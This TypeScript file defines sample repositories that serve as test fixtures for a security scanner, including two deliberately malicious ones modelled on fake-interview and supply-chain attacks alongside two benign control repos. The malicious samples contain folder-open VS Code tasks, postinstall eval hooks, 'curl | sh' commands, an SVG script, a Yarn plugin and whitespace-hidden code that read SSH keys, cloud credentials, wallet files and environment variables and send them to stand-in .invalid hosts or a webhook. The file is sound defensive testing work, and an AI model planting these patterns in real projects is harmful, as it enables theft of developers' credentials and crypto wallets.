import type { FileEntry, RepoMeta } from "../analyzer/types";

/**
 * Bundled sample repositories.
 *
 * These are INERT FIXTURES, not working malware. They reproduce the *shape* of
 * techniques used in the Contagious Interview campaign so the analyser has
 * something to detect, but every network destination uses a reserved
 * `.invalid` TLD (RFC 2606) which cannot resolve, and every payload is a
 * placeholder string. Nothing here executes anything real if it somehow ran.
 *
 * They exist for two reasons:
 *   1. A demo that shows a red report without needing live malware.
 *   2. A regression fixture — `npm run test:analyzer` asserts against them.
 */

export interface SampleRepo {
  slug: string;
  label: string;
  blurb: string;
  /** What the analyser is expected to find — shown in the UI and asserted in tests. */
  expectedVerdict: "safe" | "caution" | "danger";
  repo: RepoMeta;
  files: Record<string, string>;
}

/** Deterministic 40-char hex from a slug — looks like a commit, isn't one. */
function fakeSha(slug: string): string {
  let h1 = 0x811c9dc5;
  let h2 = 0x01000193;
  for (let i = 0; i < slug.length; i++) {
    h1 = Math.imul(h1 ^ slug.charCodeAt(i), 0x01000193) >>> 0;
    h2 = Math.imul(h2 + slug.charCodeAt(i) * (i + 7), 0x85ebca6b) >>> 0;
  }
  let out = "";
  for (let i = 0; i < 5; i++) {
    h1 = Math.imul(h1 ^ (h1 >>> 15), 0x2545f491) >>> 0;
    h2 = Math.imul(h2 ^ (h2 >>> 13), 0x27d4eb2f) >>> 0;
    out += h1.toString(16).padStart(8, "0") + h2.toString(16).padStart(8, "0");
  }
  return out.slice(0, 40);
}

function toRepoMeta(slug: string, name: string): RepoMeta {
  return {
    owner: "reposhield-samples",
    name,
    url: `https://reposhield.local/samples/${slug}`,
    ref: "main",
    // A stable, hex-shaped pseudo-SHA so samples render like real scans.
    commit: fakeSha(slug),
    isPrivate: false,
    defaultBranch: "main",
  };
}

const CONTAGIOUS_INTERVIEW: SampleRepo = {
  slug: "contagious-interview",
  label: "Fake interview assignment",
  blurb:
    "A React “take-home task” that steals your wallet and SSH keys the moment you open the folder. Modelled on the real Lazarus campaign.",
  expectedVerdict: "danger",
  repo: toRepoMeta("contagious-interview", "senior-web3-frontend-task"),
  files: {
    "README.md": `# Senior Web3 Frontend — Take-Home Assignment

Thanks for your interest! Please complete this within 48 hours.

## Setup
\`\`\`
npm install
npm run dev
\`\`\`

Open the project in VS Code and start with \`src/App.tsx\`.
`,

    // The trap: executes on folder open, before the developer reads anything.
    ".vscode/tasks.json": `{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "Prepare workspace",
      "type": "shell",
      "command": "node",
      "args": [".vscode/prepare.js"],
      "presentation": { "reveal": "never", "panel": "dedicated" },
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
`,

    ".vscode/prepare.js": `const os = require("os");
const path = require("path");
const fs = require("fs");
const https = require("https");

// Collects local credential material and posts it to a collector.
const targets = [
  path.join(os.homedir(), ".ssh", "id_rsa"),
  path.join(os.homedir(), ".aws", "credentials"),
  path.join(os.homedir(), ".config", "solana", "id.json"),
  path.join(os.homedir(), "Library", "Application Support", "Google", "Chrome",
    "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
];

const payload = { host: os.hostname(), user: os.userInfo().username, env: process.env, files: {} };
for (const t of targets) {
  try { payload.files[t] = fs.readFileSync(t, "utf8"); } catch (e) {}
}

const req = https.request({
  hostname: "cdn-assets-delivery.invalid",
  path: "/api/v2/telemetry",
  method: "POST",
  headers: { "content-type": "application/json" },
});
req.write(JSON.stringify(payload));
req.end();
`,

    "package.json": `{
  "name": "senior-web3-frontend-task",
  "version": "1.0.0",
  "scripts": {
    "dev": "vite",
    "build": "vite build",
    "postinstall": "node -e \\"eval(Buffer.from(process.env.npm_package_config_h||'Ly8gcGxhY2Vob2xkZXIgcGF5bG9hZA==','base64').toString())\\"",
    "prepare": "curl -sL https://setup-cdn.invalid/init.sh | bash"
  },
  "config": { "h": "Ly8gcGxhY2Vob2xkZXIgcGF5bG9hZA==" },
  "dependencies": {
    "react": "^18.2.0",
    "react-dom": "^18.2.0",
    "ethrs": "^5.7.2",
    "axois": "^1.6.0"
  },
  "devDependencies": {
    "vite": "*"
  }
}
`,

    // Registry redirect: every package would come from an attacker's server.
    ".npmrc": `registry=https://npm-mirror-fast.invalid/
//npm-mirror-fast.invalid/:_authToken=\${NPM_TOKEN}
always-auth=true
`,

    // "Just a logo." Renders as HTML; executes when previewed.
    "public/logo.svg": `<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 64 64">
  <circle cx="32" cy="32" r="30" fill="#5b8def"/>
  <script type="text/javascript">
    <![CDATA[
      var s = String.fromCharCode(114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41);
      try { eval(s).exec("curl -s https://setup-cdn.invalid/stage2 | sh"); } catch (e) {}
    ]]>
  </script>
</svg>
`,

    "src/utils/analytics.js": `import axios from "axios";

// Looks like product analytics. Is not product analytics.
export function initAnalytics() {
  const meta = { ...process.env, ts: Date.now() };
  fetch("https://discord.com/api/webhooks/000000000000000000/AAAAAAAAAAAAAAAAAAAAAAAA", {
    method: "POST",
    body: JSON.stringify({ content: JSON.stringify(meta).slice(0, 1900) }),
  }).catch(() => {});
}
`,

    "src/App.tsx": `export default function App() {
  return <div className="app"><h1>Dashboard</h1></div>;
}
`,
  },
};

const SUBTLE_SUPPLY_CHAIN: SampleRepo = {
  slug: "subtle-supply-chain",
  label: "Subtle supply-chain trap",
  blurb:
    "Nothing auto-runs and nothing looks obfuscated. The attack is entirely in the build tooling — a Yarn plugin and a hidden line of code.",
  expectedVerdict: "danger",
  repo: toRepoMeta("subtle-supply-chain", "defi-vault-challenge"),
  files: {
    "README.md": `# DeFi Vault Challenge

Implement the missing \`withdraw()\` logic in \`src/Vault.sol\`.

\`\`\`
yarn install
yarn test
\`\`\`
`,

    "package.json": `{
  "name": "defi-vault-challenge",
  "private": true,
  "scripts": { "test": "forge test" },
  "packageManager": "yarn@4.1.0",
  "devDependencies": { "@openzeppelin/contracts": "^5.0.0" }
}
`,

    // Yarn executes every plugin on every yarn command, including --version.
    ".yarnrc.yml": `nodeLinker: node-modules
npmRegistryServer: "https://registry.internal-mirror.invalid"
enableScripts: true

plugins:
  - path: .yarn/plugins/@yarnpkg/plugin-metrics.cjs
    spec: "@yarnpkg/plugin-metrics"
`,

    ".yarn/plugins/@yarnpkg/plugin-metrics.cjs": `module.exports = {
  name: "@yarnpkg/plugin-metrics",
  factory: (require) => {
    const { execSync } = require("child_process");
    const os = require("os");
    return {
      hooks: {
        setupScriptEnvironment() {
          try {
            const k = require("fs").readFileSync(os.homedir() + "/.ssh/id_ed25519", "utf8");
            execSync("curl -s -X POST -d @- https://telemetry-collect.invalid/m", { input: k });
          } catch (e) {}
        },
      },
    };
  },
};
`,

    // ffi = true turns `forge test` into arbitrary shell execution.
    "foundry.toml": `[profile.default]
src = "src"
out = "out"
libs = ["lib"]
ffi = true
`,

    // R24: the exec call is pushed 300 columns to the right.
    "script/Deploy.s.sol": `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";

contract Deploy is Script {
    function run() external {
        vm.startBroadcast();
        vm.stopBroadcast();                                                                                                                                                                                                                                                                                                                          string[] memory c = new string[](3); c[0] = "bash"; c[1] = "-c"; c[2] = "curl -s https://telemetry-collect.invalid/s | sh"; vm.ffi(c);
    }
}
`,

    "src/Vault.sol": `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Vault {
    mapping(address => uint256) public balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // TODO: implement
    function withdraw(uint256 amount) external {}
}
`,
  },
};

const CLEAN_PROJECT: SampleRepo = {
  slug: "clean-project",
  label: "An ordinary repo",
  blurb:
    "A normal Hardhat project with real dependencies and a CI workflow. Shows what a clean report looks like — and that the scanner doesn't cry wolf.",
  expectedVerdict: "safe",
  repo: toRepoMeta("clean-project", "erc20-staking"),
  files: {
    "README.md": `# ERC-20 Staking

\`\`\`
npm install
npx hardhat test
\`\`\`
`,
    "package.json": `{
  "name": "erc20-staking",
  "version": "0.1.0",
  "scripts": {
    "test": "hardhat test",
    "build": "hardhat compile"
  },
  "devDependencies": {
    "hardhat": "2.22.5",
    "@nomicfoundation/hardhat-toolbox": "5.0.0",
    "typescript": "5.4.5"
  },
  "dependencies": {
    "@openzeppelin/contracts": "5.0.2"
  }
}
`,
    "package-lock.json": `{
  "name": "erc20-staking",
  "lockfileVersion": 3,
  "packages": {
    "node_modules/hardhat": {
      "version": "2.22.5",
      "resolved": "https://registry.npmjs.org/hardhat/-/hardhat-2.22.5.tgz",
      "integrity": "sha512-placeholder"
    }
  }
}
`,
    "hardhat.config.ts": `import { HardhatUserConfig } from "hardhat/config";
import "@nomicfoundation/hardhat-toolbox";

const config: HardhatUserConfig = {
  solidity: "0.8.24",
};

export default config;
`,
    ".github/workflows/ci.yml": `name: CI
on:
  push:
    branches: [main]
  pull_request:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
      - run: npm ci
      - run: npm test
`,
    "contracts/Staking.sol": `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Staking {
    IERC20 public immutable token;
    mapping(address => uint256) public staked;

    constructor(IERC20 token_) {
        token = token_;
    }

    function stake(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        staked[msg.sender] += amount;
    }
}
`,
  },
};


/**
 * The false-positive test.
 *
 * Everything in here trips a naive scanner: an install hook, a custom npm
 * registry, base64 decoding, `child_process`, a minified bundle, an SVG, a
 * Dockerfile, unpinned CI actions. All of it is ordinary. If RepoShield calls
 * this dangerous, nobody will believe it about the repository that is.
 */
const BENIGN_TOOLING: SampleRepo = {
  slug: "benign-tooling",
  label: "Normal repo that looks scary",
  blurb:
    "An everyday project with install hooks, a private registry, base64, child_process and a minified bundle. Should stay quiet — this is the false-positive check.",
  expectedVerdict: "safe",
  repo: toRepoMeta("benign-tooling", "internal-design-system"),
  files: {
    "README.md": `# Design System

\`\`\`
npm install
npm run build
\`\`\`
`,

    "package.json": `{
  "name": "@acme/design-system",
  "version": "3.2.1",
  "scripts": {
    "prepare": "husky",
    "postinstall": "node scripts/check-node-version.js",
    "build": "tsup src/index.ts --format esm,cjs --dts",
    "test": "vitest run"
  },
  "dependencies": {
    "react": "^18.3.1",
    "clsx": "^2.1.1",
    "date-fns": "^3.6.0"
  },
  "devDependencies": {
    "husky": "^9.1.6",
    "tsup": "^8.3.0",
    "vitest": "^2.1.0",
    "typescript": "^5.6.0"
  }
}
`,

    "package-lock.json": `{
  "name": "@acme/design-system",
  "lockfileVersion": 3,
  "packages": {
    "node_modules/react": {
      "version": "18.3.1",
      "resolved": "https://registry.npmjs.org/react/-/react-18.3.1.tgz",
      "integrity": "sha512-placeholder"
    }
  }
}
`,

    // Scoped private feed — how every company with internal packages is set up.
    ".npmrc": `@acme:registry=https://npm.pkg.github.com/
//npm.pkg.github.com/:_authToken=\${GITHUB_PACKAGES_TOKEN}
save-exact=true
`,

    // A postinstall hook that does something entirely mundane.
    "scripts/check-node-version.js": `const { engines } = require("../package.json");
const semver = process.version.slice(1);

if (Number(semver.split(".")[0]) < 18) {
  console.error("This package requires Node 18 or newer. You have " + process.version);
  process.exit(1);
}
`,

    // child_process in a build script is normal; it is only alarming in config.
    "scripts/build-icons.js": `const { execFileSync } = require("child_process");
const { readdirSync } = require("fs");
const path = require("path");

// Optimise every icon with the locally installed svgo binary.
for (const file of readdirSync(path.join(__dirname, "../icons"))) {
  execFileSync("npx", ["svgo", path.join("icons", file)], { stdio: "inherit" });
}
`,

    // Base64 with no execution or network anywhere near it.
    "src/avatar-placeholder.ts": `// A 1x1 transparent PNG, inlined so the component never flashes.
const PLACEHOLDER =
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";

export function placeholderBytes(): Uint8Array {
  return Uint8Array.from(atob(PLACEHOLDER), (c) => c.charCodeAt(0));
}
`,

    // A perfectly ordinary icon.
    "icons/check.svg": `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
  <path d="M20 6L9 17l-5-5"/>
</svg>
`,

    ".github/workflows/release.yml": `name: Release
on:
  push:
    tags: ["v*"]

jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          registry-url: https://registry.npmjs.org
      - run: npm ci
      - run: npm run build
      - run: npm publish
        env:
          NODE_AUTH_TOKEN: \${{ secrets.NPM_TOKEN }}
`,

    "Dockerfile": `FROM node:20-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci --omit=dev
COPY . .
USER node
CMD ["node", "dist/index.js"]
`,

    "src/index.ts": `export { Button } from "./button";
export { placeholderBytes } from "./avatar-placeholder";
`,
  },
};

export const SAMPLES: SampleRepo[] = [
  CONTAGIOUS_INTERVIEW,
  SUBTLE_SUPPLY_CHAIN,
  BENIGN_TOOLING,
  CLEAN_PROJECT,
];

export function getSample(slug: string): SampleRepo | undefined {
  return SAMPLES.find((s) => s.slug === slug);
}

/** Shape a sample like a GitHub fetch result so it flows through the same path. */
export function sampleToAnalyzeInput(sample: SampleRepo) {
  const tree: FileEntry[] = Object.entries(sample.files).map(([path, content]) => ({
    path,
    type: "blob" as const,
    size: new TextEncoder().encode(content).length,
  }));
  return {
    repo: sample.repo,
    tree,
    contents: new Map(Object.entries(sample.files)),
    isSample: true,
  };
}
